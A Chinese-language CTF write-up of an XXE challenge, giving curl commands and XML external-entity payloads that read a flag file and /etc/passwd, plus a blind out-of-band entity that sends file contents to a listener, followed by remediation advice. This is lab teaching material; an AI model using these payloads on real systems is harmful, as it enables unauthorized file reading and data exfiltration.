---
title: "XXE 实体注入读取 flag（XXEmoeCTF 2025）"
slug: "ctf-xxemoe-2025"
date: 2026-08-27T17:28:41+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "用外部实体直接读取 /var/www/html/flag.txt，最短的一次 XXE 通关记录。"
summary: "用外部实体直接读取 /var/www/html/flag.txt，最短的一次 XXE 通关记录。"
tags: ["CTF", "XXE", "Web"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 1
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/1.XXEmoeCTF2025.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-xxemoe-2025/workflow.svg" alt="XXE 文件读取最小链：XML 输入、实体定义、解析、回显和读取 flag。" loading="lazy">
  <figcaption>图 1 · XXE 文件读取最小链。XML 解析器展开外部实体，把本地 flag 文件带入响应。</figcaption>
</figure>

## 1. 前置条件

- 目标是**明确授权**的 CTF 或公开靶场环境；
- 请求体或某个字段会被 XML 解析器处理；
- 解析器允许 `DOCTYPE` 和外部实体；
- 你知道目标要读取的文件路径，本题为 `/var/www/html/flag.txt`。

先准备变量，后续命令可直接替换：

```bash
export TARGET='http://127.0.0.1:<target-port>'
export ENDPOINT="$TARGET/api/xml"
```

> 不知道接口时，先用浏览器开发者工具或 Burp 找到真正接收 XML 的请求，不要对任意路径盲发 payload。

## 2. 最小探测

先发送合法 XML，确认接口和响应结构：

```bash
curl -i -sS -X POST "$ENDPOINT" \
  -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><data><name>test</name></data>'
```

需要确认：

1. 状态码是否为 `200`；
2. 返回里是否出现 `test`；
3. 响应是否会把 XML 字段回显；
4. 服务端是否接受 `Content-Type: application/xml`。

如果合法 XML 都不通，先不要继续。

## 3. 构造外部实体

完整请求体：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY flag SYSTEM "file:///var/www/html/flag.txt">
]>
<data>
  <name>&flag;</name>
</data>
```

发送：

```bash
cat > /tmp/xxe.xml <<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY flag SYSTEM "file:///var/www/html/flag.txt">
]>
<data>
  <name>&flag;</name>
</data>
XML

curl -i -sS -X POST "$ENDPOINT" \
  -H 'Content-Type: application/xml' \
  --data-binary @/tmp/xxe.xml
```

预期结果：响应中出现类似：

```text
flag{...}
```

如果返回 400、403 或解析错误，按下一节逐项排查。

## 4. 排错分支

| 现象 | 可能原因 | 下一步 |
| --- | --- | --- |
| `DOCTYPE` 被拒绝 | 解析器关闭 DTD | 尝试参数实体或改用其他漏洞 |
| 实体未展开 | 只解析 XML 但不替换实体 | 检查响应是否只返回空值 |
| `file://` 被限制 | 禁用了外部实体协议 | 先试 `http://` DNS/HTTP 外带 |
| 读取路径不存在 | flag 路径变化 | 先读 `/etc/passwd` 验证文件读取 |
| 页面正常但无回显 | blind XXE | 搭 DNS/HTTP 监听并使用外带 |

先验证文件读取能力：

```xml
<!ENTITY test SYSTEM "file:///etc/passwd">
```

如果能读到 `/etc/passwd`，再回到题目给出的 flag 路径。

## 5. 盲 XXE 的外带思路

没有回显时，可以把实体值拼到参数里，请求你的授权监听端：

```xml
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///var/www/html/flag.txt">
  <!ENTITY % remote SYSTEM "http://127.0.0.1:<listener-port>/leak?data=%file;">
  %remote;
]>
```

本地监听：

```bash
python3 -m http.server 8000 --bind 127.0.0.1
```

这条链依赖目标允许参数实体和外部 DTD，不能保证所有 XXE 都适用。失败时要记录服务器返回的错误，而不是反复换 payload。

## 6. 修复建议

- 禁用 DTD 和外部实体；
- 使用配置安全的 XML 解析器；
- 不接受不可信 XML；
- 对文件读取和网络访问做最小权限限制；
- 对解析异常做统一错误响应，避免泄漏文件存在性。

## 7. 复现检查表

- [ ] 已确认 XML 接口
- [ ] 已用合法 XML 建立基线
- [ ] 已确认 DTD/实体是否被解析
- [ ] 已先读 `/etc/passwd` 验证文件读取
- [ ] 已从回显或外带通道取得 flag
- [ ] 已记录请求、响应和失败分支
